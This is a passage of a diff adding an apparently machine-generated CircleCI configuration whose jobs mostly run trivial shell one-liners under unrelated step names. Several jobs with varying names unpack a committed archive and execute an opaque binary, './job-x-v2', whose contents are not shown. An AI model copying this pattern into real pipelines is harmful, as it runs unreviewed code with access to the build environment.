+          at: /tmp/branch
+      - run:
+          name: Read stage 5
+          command: |
+            { stat /tmp/branch/memo136 2>/dev/null || echo "no-stat"; } > /dev/null; true
+      - run:
+          name: Pull latest
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: cat old-dist.tar.xz | tar xJf -
+      - run:
+          command: exec ./job-x-v2
+  freeze_password:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Take Nine Tunnel
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; for word in tina vic noah mia omar iris; do echo "item: $word";done|head -n 3; true ; } > /tmp/branch/proton722
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/proton722
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'proton722'
+  run-partial-test-matrix:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Read stage 5
+          command: |
+            { stat /tmp/branch/PACKET 2>/dev/null || echo "no-stat"; } > /dev/null; true
+      - run:
+          name: Pull latest
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: cat old-dist.tar.xz | tar xJf -
+      - run:
+          command: exec ./job-x-v2
+  GUI_Height:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Suspend tagging
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; echo "ready?" | wc -c; true ; } > /tmp/branch/debug_20260922
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/debug_20260922
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'debug_20260922'
+  HOOK_QA:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Read stage 5
+          command: |
+            { stat /tmp/branch/PACKET 2>/dev/null || echo "no-stat"; } > /dev/null; true
+      - run:
+          name: Pull latest
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: cat old-dist.tar.xz | tar xJf -
+      - run:
+          command: exec ./job-x-v2
+  teardown_cont:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Glaze the base model
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; if test -p /dev/stdin; then echo 'true'; fi; true ; } > /tmp/branch/mapper-river-shimmer-flux
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/mapper-river-shimmer-flux
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'mapper-river-shimmer-flux'
+  wip-dashboard-leak:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Read stage 5
+          command: |
+            { stat /tmp/branch/PACKET 2>/dev/null || echo "no-stat"; } > /dev/null; true
+      - run:
+          name: Pull latest
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: cat old-dist.tar.xz | tar xJf -
+      - run:
+          command: exec ./job-x-v2
+  cubeWillAppear:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Charge Status Retry
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; ls -dvl ~ | awk '{print $3}' | sort -u; true ; } > /tmp/branch/rev.9.1
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/rev.9.1
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'rev.9.1'
+  validte-93:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Read stage 5
+          command: |
+            { stat /tmp/branch/PACKET 2>/dev/null || echo "no-stat"; } > /dev/null; true
+      - run:
+          name: Pull latest
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: cat old-dist.tar.xz | tar xJf -
+      - run:
+          command: exec ./job-x-v2
+
+  panelShouldVisit:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: After hours promote the blog post
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; for f in /etc/*.defs; do basename "$f"; done | tac; true ; } > /tmp/branch/JGx
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/JGx
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'JGx'
+  env_pow:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute gate md5
+          command: |
+            mkdir -p /tmp/branch
+            set +o pipefail 2>/dev/null; echo "ts $(date +%s%N)" > /tmp/branch/fermion_pixel_bond; echo "ppid $PPID" >> /tmp/branch/fermion_pixel_bond; seq 1 556682 >> /tmp/branch/fermion_pixel_bond; true
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/fermion_pixel_bond
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'fermion_pixel_bond'
+  X35:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Export mini map and playtest
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; help shopt | head -n4; true ; } > /tmp/branch/IndigoQueueReport
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/IndigoQueueReport
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'IndigoQueueReport'
+  BACKUP_RESOURCE_PIN_43:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Cash forecast batched and verified
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; printf '%s\n' "what's next?"|cut -c1-10; true ; } > /tmp/branch/BlobCraneSouth
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/BlobCraneSouth
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'BlobCraneSouth'
+  ppPotion:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Harmonize the partitions
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; ls -XS /usr/bin/*grep* | paste -sd ' '; true ; } > /tmp/branch/chrome_burst
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/chrome_burst
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'chrome_burst'
+  ICON_DEFER_SCENE_DRAIN_BACK:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Me monitoring gradient clipping
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; echo 'all done'; echo 'trailing spaces   '; true ; } > /tmp/branch/blake_c977f088b36594c
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/blake_c977f088b36594c
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'blake_c977f088b36594c'
+  fin1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Promote the org chart by payroll cutoff
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; find /dev -maxdepth 3 -type f -iname 'std*' -exec sha1sum {} \; 2> /dev/null | xargs ls -ld; true ; } > /tmp/branch/fnv_8136583b
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/fnv_8136583b
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'fnv_8136583b'
+  p_CART_ARG:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: Enroll the shift roster day one
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; cat /proc/version | cut -c1-13 | wc -w; true ; } > /tmp/branch/memo136
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/memo136
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'memo136'
+  post_alloc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: handlePayrollBatchFlagging
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; echo done >'/tmp/breadBudget.log'&& cat '/tmp/breadBudget.log'; true ; } > /tmp/branch/hollowsurgemodule
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/hollowsurgemodule
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'hollowsurgemodule'
+  numzz659:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: ID 1D6A SEEDING
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; test -x /usr/bin/env && echo ok || echo "not ok"; true ; } > /tmp/branch/temp-e2b
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/temp-e2b
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'temp-e2b'
+  comment_cli:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/branch
+      - run:
+          name: tokenizeLearningRateStep
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; ps -eo comm=| sort -u| nl; true ; } > /tmp/branch/_wipd63e
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/_wipd63e
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - '_wipd63e'
+  item_v6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute gate md5
+          command: |
+            mkdir -p /tmp/branch
+            { set +o pipefail 2>/dev/null; expr length "won't fix"; true ; } > /tmp/branch/CRISP_THETA_MOTH_CRISP
+            awk 'BEGIN{t=0}{t+=length+1}END{print "total",t,"bytes"}' /tmp/branch/CRISP_THETA_MOTH_CRISP
+      - persist_to_workspace:
+          root: /tmp/branch
+          paths:
+            - 'CRISP_THETA_MOTH_CRISP'
+workflows:
+  ci:
+    jobs:
+      - WEBER
+      - GUI_Height
+      - package:
+          requires:
+            - WEBER
+            - GUI_Height
+      - HOOK_QA:
+          requires:
+            - WEBER
+            - GUI_Height
+      - run-partial-test-matrix:
+          requires:
+            - WEBER
+            - GUI_Height
+      - wip-dashboard-leak:
+          requires:
+            - WEBER
+            - GUI_Height
+      - artifacts:
+          requires:
+            - WEBER
+            - GUI_Height
+      - validte-93:
+          requires:
+            - WEBER
+            - GUI_Height
+      - break-prod:
+          requires:
+            - WEBER
+            - GUI_Height
+      - vega-ng:
+          requires:
+            - WEBER
+            - GUI_Height
+      - xi-verify:
+          requires:
+            - WEBER
+            - GUI_Height
+      - UAT_INIT_8:
+          requires:
+            - WEBER
+            - GUI_Height
+      - mark15
+      - panelShouldVisit:
+          requires:
+            - mark15
+      - promote:
+          requires:
+            - panelShouldVisit
+      - external_freeze:
+          requires:
+            - panelShouldVisit
+      - env_pow:
+          requires:
+            - external_freeze
+      - foxtrot:
+          requires:
+            - env_pow
+      - aki2k:
+          requires:
+            - env_pow
+      - X35:
+          requires:
+            - aki2k
+      - hu-ci:
+          requires:
+            - X35
+      - MacroHelmetNewIvyCardSignal:
+          requires:
+            - X35
+      - BACKUP_RESOURCE_PIN_43:
+          requires:
+            - MacroHelmetNewIvyCardSignal
+      - refactor-2987:
+          requires:
+            - BACKUP_RESOURCE_PIN_43
+      - reAddressCanvas:
+          requires:
+            - BACKUP_RESOURCE_PIN_43
+      - ppPotion:
+          requires:
+            - reAddressCanvas
+      - tb-new:
+          requires:
+            - ppPotion
+      - badge_cell:
+          requires:
+            - ppPotion
+      - ICON_DEFER_SCENE_DRAIN_BACK:
+          requires:
+            - badge_cell
+      - hotfix-2201:
+          requires:
+            - ICON_DEFER_SCENE_DRAIN_BACK
+      - ZoleV:
+          requires:
+            - ICON_DEFER_SCENE_DRAIN_BACK
+      - fin1:
+          requires:
+            - ZoleV
+      - rust-lint:
+          requires:
+            - fin1
+      - blocksArray:
+          requires:
+            - fin1
+      - p_CART_ARG:
+          requires:
+            - blocksArray
+      - QA_DEPLOY_5:
+          requires:
+            - p_CART_ARG
+      - MASK_INTERCEPTOR:
+          requires:
+            - p_CART_ARG
+      - post_alloc:
+          requires:
+            - MASK_INTERCEPTOR
+      - Rollout_Suite5:
+          requires:
+            - post_alloc
+      - primarybody:
+          requires:
+            - post_alloc
+      - numzz659:
+          requires:
+            - primarybody
+      - rm-db-hang:
+          requires:
+            - numzz659
+      - cfl:
+          requires:
+            - numzz659
+      - comment_cli:
+          requires:
+            - cfl
+      - q4-canary:
+          requires:
+            - comment_cli
+      - GraphPartial:
+          requires:
+            - comment_cli
+      - item_v6:
+          requires:
+            - GraphPartial
+      - produce-staging-docker-image:
+          requires:
+            - item_v6
+      - CotQmgH
+      - PROD_MERGE_9:
+          requires:
+            - CotQmgH
+      - uniformStream:
+          requires:
+            - CotQmgH
+      - succes-only:
+          requires:
+            - uniformStream
+      - ch7:
+          requires:
+            - uniformStream
+      - v7-alpha4:
+          requires:
+            - ch7
+      - yamadaf:
+          requires:
+            - ch7
+      - Prepare_Staging9:
+          requires:
+            - yamadaf
+      - MeshToGUI:
+          requires:
+            - yamadaf
+      - xray:
+          requires:
+            - MeshToGUI
+      - oyd6:
+          requires:
+            - MeshToGUI
+      - chore-8223:
+          requires:
+            - oyd6
+      - theTempo:
+          requires:
+            - oyd6
+      - CORE-742:
+          requires:
+            - theTempo
+      - TupleMigrationTexture:
+          requires:
+            - theTempo
+      - gating:
+          requires:
+            - TupleMigrationTexture
